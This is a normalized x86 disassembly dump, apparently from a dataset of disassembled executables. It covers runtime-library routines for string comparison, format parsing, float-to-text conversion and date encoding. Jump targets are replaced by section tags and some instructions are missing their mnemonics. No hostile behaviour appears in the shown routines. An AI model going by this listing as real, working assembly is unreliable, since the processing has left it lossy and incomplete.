xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_40881c
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408874
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_4088fc
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_4086dc
mov esi eax
inc esi
mov eax esi
call sub_4088dc
mov ecx esi
mov edx ebx
call sub_408708
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_408938
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40c0d0
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_408708
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_407b58
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_4089c0
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_408d17
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_408aa2
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_408aea
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_408aa2
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_4089b4
pop edx
or edx edx
je r-xdata
sub_408aa2
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_408d17
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_408aea
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_408d17
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_408938
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_408b11 ]
mov ebx ecx
sub cl 0x44
je sub_407f70
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_4041d0
jmp r-xdata
mov esi sub_404230
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_407f70
sub cl 0x44
je sub_407f04
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_407f04
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407f70
mov ecx 0x10
cmp bl 0x58
je sub_407f04
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_408990
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_408ed0
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407f04
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_408d38
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_4086dc
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_4089c0
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_408d78
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_4086dc
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_4089c0
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_408dcc
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_404268
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_404268
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_404268
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_4089c0
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_404098
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_403fa8
mov eax esi
mov edx ebx
call sub_4045f4
mov eax [ ebp - 0x4 ]
call sub_404268
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_4089c0
mov edx esi
xchg edx eax
call sub_4045f4
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_408e8c
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_408ed0
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_4091a4
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_408fcf
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_408fd9
call sub_408fcf
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408e8c
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_409035
call sub_408fcf
call sub_408fc6
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_408fc6
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408e8c
retn
xor ecx ecx
sub_409071
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_408fc6
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_408fc6
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_4090d6
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_40912a
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_409071
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_4091a4
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_4091d1
jmp r-xdata
call sub_4092f3
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_4091d1
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402da4
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_4092f3
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_4093d0
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_409487
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_409492
neg edx
mov ecx esi
call sub_409492
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_409487
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_4094ae
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402da4
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_409492
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_4094ae
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_4094e4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_408ed0
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404098
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409514
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_408ed0
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404098
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_409560
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_404468
mov edx esp
xor ecx ecx
call sub_4093d0
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_40958c
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_404468
mov edx esp
xor ecx ecx
call sub_4093d0
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_4095d4
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_409618
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_409688
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_409618
test al al
jne r-xdata
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_407b40
sub_4096c8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_4095d4
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407b24
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407b24
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407b24
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409724
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_409760
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_409724
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_409828
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_409760
test al al
jne r-xdata
fld [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_407b40
sub_409858
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_4095d4
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407b24
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407b24
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407b24
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
